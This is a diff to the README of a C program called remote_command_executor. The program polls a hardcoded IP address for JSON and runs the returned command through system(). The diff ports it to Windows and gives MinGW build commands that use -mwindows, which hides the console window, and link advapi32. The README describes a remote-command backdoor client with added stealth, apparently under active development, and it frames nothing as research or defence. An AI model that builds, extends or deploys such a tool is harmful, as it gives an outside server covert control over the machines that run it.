@@ -8,8 +8,10 @@ This program connects to `134.209.61.208:80` via HTTP, retrieves a JSON response
 
 ## Requirements
 
-- C compiler (gcc, clang, or equivalent)
-- Unix-like system (Linux, macOS) with POSIX socket support
+- C compiler:
+  - **On Windows**: MinGW or MinGW-w64 (gcc)
+  - **Cross-compiling from Linux/macOS**: MinGW-w64 cross-compiler (x86_64-w64-mingw32-gcc)
+- Target platform: Windows (uses Windows Sockets API)
 - Network connectivity to 134.209.61.208:80
 - Write permissions in current directory (for error.log)
 
@@ -21,14 +23,20 @@ make
 
 Or manually:
 
+**On Windows with MinGW:**
 ```bash
-gcc -std=c99 -Wall -Wextra -o remote_command_executor remote_command_executor.c
+gcc -std=c99 -Wall -Wextra -mwindows -o remote_command_executor.exe remote_command_executor.c -lws2_32 -ladvapi32
+```
+
+**Cross-compiling from Linux/macOS:**
+```bash
+x86_64-w64-mingw32-gcc -std=c99 -Wall -Wextra -mwindows -o remote_command_executor.exe remote_command_executor.c -lws2_32 -ladvapi32
 ```
 
 ## Usage
 
 ```bash
-./remote_command_executor
+remote_command_executor.exe
 ```
 
 The program will:
@@ -79,8 +87,8 @@ Error: Command execution failed with exit status 1
 
 ## Implementation Details
 
-- Uses only C standard library (no external dependencies)
-- Manual HTTP implementation via POSIX sockets
+- Uses only C standard library and Windows API (no external dependencies)
+- Manual HTTP implementation via Windows Sockets (Winsock2)
 - Manual JSON parsing for simple key-value structure
 - Command execution via `system()` function
 - Error logging to file using standard file I/O
